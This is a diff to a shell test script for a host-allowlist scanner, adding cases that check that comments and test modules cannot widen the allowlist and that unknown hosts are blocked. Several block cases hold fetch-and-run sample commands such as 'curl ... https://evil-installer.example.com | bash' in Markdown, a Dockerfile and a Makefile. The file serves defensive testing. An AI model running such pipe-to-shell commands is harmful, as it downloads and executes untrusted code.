@@ -57,6 +57,31 @@ else
   pass=$((pass + 1)); printf 'ok   allowlist stops at the test module\n'
 fi
 
+
+# A host named in a comment inside a const array must not widen the allowlist:
+# the extraction strips `//` to end of line.
+probe_src="$(mktemp)"
+cat > "$probe_src" <<'RS'
+pub const SERVICE_HOSTS: &[&str] = &[
+    // formerly "exfil.example.com", kept for reference
+    "auth-api.erpc.global",
+];
+#[cfg(test)]
+mod tests { const X: &str = "fixture.example.com"; }
+RS
+probe_out=$(awk '
+  /^#\[cfg\(test\)\]/ { exit }
+  /^pub const [A-Z_]+: &\[/ { inside = 1 }
+  inside { line = $0; sub(/\/\/.*/, "", line); print line }
+  inside && /\];/ { inside = 0 }
+' "$probe_src" | grep -v '("' | grep -oE '"[^"]+"' | tr -d '"' | sort -u)
+rm -f "$probe_src"
+if printf '%s\n' "$probe_out" | grep -qE 'exfil|fixture'; then
+  fail=$((fail + 1)); printf 'FAIL a host in a comment or the test module must not widen the allowlist\n'
+else
+  pass=$((pass + 1)); printf 'ok   comments and the test module cannot widen the allowlist\n'
+fi
+
 # --- must block -------------------------------------------------------------
 
 check "unknown host in rust" block "$sample_dir/a.rs" \
@@ -77,6 +102,24 @@ check "unknown websocket host" block "$sample_dir/e.ts" \
 check "insecure link in documentation" block "$sample_dir/f.md" \
   'Download it from http://mirror.example.org/erpc'
 
+check "markdown install command to an unknown host" block "$sample_dir/m.md" \
+  'Run `curl -sSfL https://evil-installer.example.com | bash` to install.'
+
+check "extensionless script with an unknown host" block "$sample_dir/Makefile" \
+  'fetch:\n\tcurl -sSfL https://evil.example.com/x -o out'
+
+check "dockerfile with an unknown host" block "$sample_dir/Dockerfile" \
+  'RUN curl -sSfL https://evil.example.com/x | sh'
+
+check "python file with an unknown host" block "$sample_dir/n.py" \
+  'URL = "https://evil.example.com/x"'
+
+check "uppercase scheme" block "$sample_dir/o.rs" \
+  'const U: &str = "HTTPS://evil.example.com/x";'
+
+check "handlebars template with an unknown host" block "$sample_dir/p.hbs" \
+  '<a href="https://evil.example.com">x</a>'
+
 # --- must allow -------------------------------------------------------------
 
 check "allowlisted service host" allow "$sample_dir/g.rs" \
@@ -96,6 +139,10 @@ check "template expression without a literal host" allow "$sample_dir/k.yml" \
 
 check "documentation link over https" allow "$sample_dir/l.md" \
   'See https://keepachangelog.com/en/1.1.0/ for the format.'
+
+
+check "markdown install command to an allowlisted host" allow "$sample_dir/q.md" \
+  'Run `curl -sSfL https://install.erpc.global | bash` to install.'
 
 printf '\n%s passed, %s failed\n' "$pass" "$fail"
 [ "$fail" -eq 0 ]
